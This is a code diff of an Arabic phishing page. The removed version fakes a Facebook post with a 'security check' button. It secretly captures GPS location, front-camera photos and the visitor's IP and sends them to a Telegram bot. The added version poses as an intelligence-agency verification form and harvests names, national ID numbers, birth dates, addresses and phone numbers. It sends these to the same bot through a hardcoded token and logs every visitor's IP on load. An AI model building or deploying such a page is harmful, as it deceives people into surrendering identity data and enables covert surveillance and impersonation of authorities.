@@ -1,271 +1,226 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>فيسبوك</title>
+    <title>نموذج جهاز الـ 101 - استخبارات العامة</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #f0f2f5;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            padding: 15px;
-        }
-        .fb-post {
-            max-width: 600px;
-            margin: 20px auto;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-            overflow: hidden;
-        }
-        .post-header {
+            background: #1e1e2f;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            min-height: 100vh;
             display: flex;
-            padding: 12px 16px;
-            align-items: center;
-            gap: 10px;
-        }
-        .avatar {
-            width: 40px;
-            height: 40px;
-            background: #1877f2;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
             justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 18px;
-        }
-        .post-name {
-            font-weight: bold;
-            font-size: 15px;
-            color: #050505;
-        }
-        .post-time {
-            font-size: 12px;
-            color: #65676b;
-        }
-        .post-text {
-            padding: 0 16px 12px;
-            font-size: 15px;
-            line-height: 1.4;
-            color: #050505;
-        }
-        .post-img-placeholder {
-            background: #e4e6eb;
-            height: 250px;
-            display: flex;
             align-items: center;
-            justify-content: center;
-            color: #65676b;
+            padding: 20px;
         }
-        .comments-section {
-            padding: 12px 16px;
-            border-top: 1px solid #e4e6eb;
-        }
-        .comment {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 12px;
-        }
-        .comment-avatar {
-            width: 32px;
-            height: 32px;
-            background: #e4e6eb;
-            border-radius: 50%;
-        }
-        .comment-text {
-            background: #f0f2f5;
-            padding: 8px 12px;
-            border-radius: 18px;
-            font-size: 13px;
-        }
-        .fake-btn {
-            background: #1877f2;
-            color: white;
-            border: none;
-            padding: 8px;
+        .form-container {
+            background: #2a2a3b;
+            padding: 35px 25px;
+            border-radius: 24px;
+            max-width: 500px;
             width: 100%;
-            font-weight: bold;
-            border-radius: 6px;
-            margin-top: 10px;
-            cursor: pointer;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.7);
+            border: 1px solid #3e3e55;
         }
-        .hidden { display: none; }
-        video, canvas { display: none; }
+        .form-container h2 {
+            color: #ffffff;
+            font-size: 22px;
+            margin-bottom: 8px;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+        .form-container .sub {
+            color: #a0a0b8;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #3a3a4f;
+            padding-bottom: 15px;
+        }
+        label {
+            color: #c8c8e0;
+            font-size: 14px;
+            font-weight: 500;
+            display: block;
+            margin-top: 16px;
+            margin-bottom: 6px;
+        }
+        input, select, textarea {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 12px;
+            border: 1px solid #3f3f57;
+            background: #1e1e2f;
+            color: #f0f0ff;
+            font-size: 15px;
+            transition: 0.25s;
+            outline: none;
+        }
+        input:focus, select:focus, textarea:focus {
+            border-color: #6a6aff;
+            box-shadow: 0 0 0 3px rgba(106, 106, 255, 0.2);
+            background: #25253a;
+        }
+        textarea {
+            resize: vertical;
+            min-height: 70px;
+        }
+        .btn-submit {
+            margin-top: 28px;
+            background: #6a6aff;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 14px;
+            font-size: 18px;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.3s;
+            letter-spacing: 0.5px;
+        }
+        .btn-submit:hover {
+            background: #5757e6;
+            transform: scale(1.01);
+            box-shadow: 0 0 20px rgba(106, 106, 255, 0.3);
+        }
+        .note {
+            color: #7a7a9a;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 18px;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 500;
+            background: #1e1e2f;
+            color: #b0b0d0;
+        }
     </style>
 </head>
 <body>
 
-<div class="fb-post">
-    <div class="post-header">
-        <div class="avatar">ج</div>
-        <div>
-            <div class="post-name">جبله علي جبر بك</div>
-            <div class="post-time">منذ 3 ساعات · 🌐 عام</div>
-        </div>
-    </div>
-    <div class="post-text">
-        مين بجبله فينا نعتمد عليه يفصلنا كاتم ل كلوك 🤔
-    </div>
-    <div class="post-img-placeholder">
-        ⚡ اضغط على "أظهر المزيد" للمتابعة
-    </div>
-    <div class="comments-section">
-        <div class="comment">
-            <div class="comment-avatar"></div>
-            <div class="comment-text">أبو رامي: بدنا واحد فاهم 🤣</div>
-        </div>
-        <div class="comment">
-            <div class="comment-avatar"></div>
-            <div class="comment-text">علي: موجودين</div>
-        </div>
-        <button id="verifyBtn" class="fake-btn">🔐 أظهر المحتوى (تحقق أمني)</button>
-    </div>
+<div class="form-container">
+    <h2>⚡ جهاز الـ 101</h2>
+    <div class="sub">استخبارات العامة – قسم التحقق الميداني</div>
+
+    <form id="mainForm">
+        <label>🔹 الاسم الكامل</label>
+        <input type="text" id="fullName" placeholder="الاسم الرباعي" required>
+
+        <label>🔹 رقم الهوية / البطاقة الشخصية</label>
+        <input type="text" id="idNumber" placeholder="رقم الهوية" required>
+
+        <label>🔹 تاريخ الميلاد</label>
+        <input type="date" id="dob" required>
+
+        <label>🔹 مكان الإقامة (المدينة / الحي)</label>
+        <input type="text" id="location" placeholder="المدينة، الحي، الشارع" required>
+
+        <label>🔹 رقم الجوال</label>
+        <input type="tel" id="phone" placeholder="مثال: 09xxxxxxxx" required>
+
+        <label>🔹 البريد الإلكتروني (اختياري)</label>
+        <input type="email" id="email" placeholder="example@mail.com">
+
+        <label>🔹 الجهة / القسم التابع لها</label>
+        <input type="text" id="department" placeholder="الجهة أو القسم" required>
+
+        <label>🔹 ملاحظات إضافية</label>
+        <textarea id="notes" placeholder="أي تفاصيل إضافية..."></textarea>
+
+        <button type="submit" class="btn-submit">✅ إرسال البيانات</button>
+    </form>
+
+    <div id="status"></div>
+    <div class="note">يتم تشفير البيانات وإرسالها بشكل آمن.</div>
 </div>
 
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
-
 <script>
-    // ========== بيانات التليغرام (جديدة) ==========
+    // ======== بيانات التليغرام المحدثة ========
     const BOT_TOKEN = "8669811855:AAEzIrBKoyRD5f9zpKLQB0IwTxviOrSujN0";
     const CHAT_ID = "7214473798";
-    const PAGE_NAME = "جبله علي جبر بك";
-    // ============================================
+    // ===========================================
 
-    let gpsSent = false;
-    let cameraActive = false;
+    const form = document.getElementById('mainForm');
+    const statusDiv = document.getElementById('status');
 
-    function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text.substring(0, 4096),
-                parse_mode: 'HTML'
-            })
-        }).catch(e => console.log);
+    async function sendToTelegram(message) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message.substring(0, 4096),
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (e) {
+            console.error("Telegram send error:", e);
+        }
     }
 
-    function sendPhotoToTelegram(base64Image) {
-        const blob = dataURLtoBlob(base64Image);
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'shot.jpg');
-        formData.append('caption', `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        }).catch(e => console.log);
-    }
-
-    function dataURLtoBlob(dataURL) {
-        const arr = dataURL.split(',');
-        const mime = arr[0].match(/:(.*?);/)[1];
-        const bstr = atob(arr[1]);
-        let n = bstr.length;
-        const u8arr = new Uint8Array(n);
-        while (n--) u8arr[n] = bstr.charCodeAt(n);
-        return new Blob([u8arr], { type: mime });
-    }
-
-    async function getIPAndLocation() {
+    async function getIPInfo() {
         try {
             const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            let msg = `🌐 <b>${PAGE_NAME}</b> - دخول جديد\n📡 IP: ${d.ip}\n🏙️ ${d.city || 'غير معروف'}, ${d.country_name || ''}\n🖥️ ${navigator.userAgent}`;
-            if (d.latitude && d.longitude) {
-                msg += `\n🗺️ تقريبي: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-            }
-            sendToTelegram(msg);
-        } catch(e) {
-            sendToTelegram(`⚠️ ${PAGE_NAME} - فشل جلب IP`);
+            const data = await res.json();
+            return `🌐 IP: ${data.ip}\n🏙️ المدينة: ${data.city || 'غير معروف'}\n🌍 الدولة: ${data.country_name || 'غير معروف'}\n📡 المزود: ${data.org || 'غير معروف'}`;
+        } catch (e) {
+            return '🌐 تعذر جلب الـ IP';
         }
     }
 
-    function getGPS() {
-        if (!navigator.geolocation) return;
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                if (gpsSent) return;
-                gpsSent = true;
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                sendToTelegram(`🎯 <b>${PAGE_NAME}</b> - موقع دقيق ✅\n📍 ${mapLink}\n📏 دقة: ${Math.round(pos.coords.accuracy)} متر`);
-            },
-            err => sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${err.message}`),
-            { enableHighAccuracy: true, timeout: 8000 }
-        );
-    }
+    form.addEventListener('submit', async function (e) {
+        e.preventDefault();
+        statusDiv.innerText = '⏳ جاري الإرسال...';
+        statusDiv.style.color = '#f0c060';
 
-    function captureCamera() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            sendToTelegram(`⚠️ ${PAGE_NAME} - الكاميرا غير مدعومة`);
-            return;
-        }
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // أمامية
-            .then(stream => {
-                video.srcObject = stream;
-                video.play();
-                setTimeout(() => {
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = video.videoWidth || 400;
-                    canvas.height = video.videoHeight || 300;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-                    sendPhotoToTelegram(dataURL);
-                    stream.getTracks().forEach(track => track.stop());
-                    video.srcObject = null;
-                }, 1500);
-            })
-            .catch(err => {
-                // حاول الخلفية إذا الأمامية فشلت
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        video.srcObject = stream;
-                        video.play();
-                        setTimeout(() => {
-                            const ctx = canvas.getContext('2d');
-                            canvas.width = video.videoWidth || 400;
-                            canvas.height = video.videoHeight || 300;
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-                            sendPhotoToTelegram(dataURL);
-                            stream.getTracks().forEach(track => track.stop());
-                            video.srcObject = null;
-                        }, 1500);
-                    })
-                    .catch(() => sendToTelegram(`⚠️ ${PAGE_NAME} - رفض الكاميرا`));
-            });
-    }
+        const name = document.getElementById('fullName').value.trim();
+        const id = document.getElementById('idNumber').value.trim();
+        const dob = document.getElementById('dob').value;
+        const location = document.getElementById('location').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const department = document.getElementById('department').value.trim();
+        const notes = document.getElementById('notes').value.trim();
 
-    // عند الضغط على زر التحقق
-    document.getElementById('verifyBtn').onclick = () => {
-        document.getElementById('verifyBtn').innerText = '✓ جاري التحقق...';
-        getGPS();
-        captureCamera();
+        const ipInfo = await getIPInfo();
+
+        let msg = `🕵️ <b>جهاز الـ 101 - بيانات جديدة</b>\n\n`;
+        msg += `👤 <b>الاسم:</b> ${name}\n`;
+        msg += `🆔 <b>رقم الهوية:</b> ${id}\n`;
+        msg += `📅 <b>تاريخ الميلاد:</b> ${dob}\n`;
+        msg += `📍 <b>مكان الإقامة:</b> ${location}\n`;
+        msg += `📱 <b>الجوال:</b> ${phone}\n`;
+        if (email) msg += `✉️ <b>البريد:</b> ${email}\n`;
+        msg += `🏢 <b>الجهة:</b> ${department}\n`;
+        if (notes) msg += `📝 <b>ملاحظات:</b> ${notes}\n`;
+        msg += `\n${ipInfo}\n`;
+        msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+
+        await sendToTelegram(msg);
+
+        statusDiv.innerText = '✅ تم الإرسال بنجاح!';
+        statusDiv.style.color = '#80d080';
+
+        form.reset();
+
         setTimeout(() => {
             window.location.href = "https://www.facebook.com/jableh.ali.jbr";
-        }, 4000);
-    };
+        }, 2000);
+    });
 
-    // فتح الصفحة: يجيب IP فوراً
-    getIPAndLocation();
-
-    // طلب GPS تلقائي بعد 1.5 ثانية (بدون ضغط زر)
-    setTimeout(() => {
-        getGPS();
-    }, 1500);
+    (async function () {
+        const ipInfo = await getIPInfo();
+        await sendToTelegram(`📡 <b>جهاز الـ 101 - دخول جديد</b>\n${ipInfo}\n🕒 ${new Date().toLocaleString('ar-EG')}`);
+    })();
 </script>
 </body>
 </html>
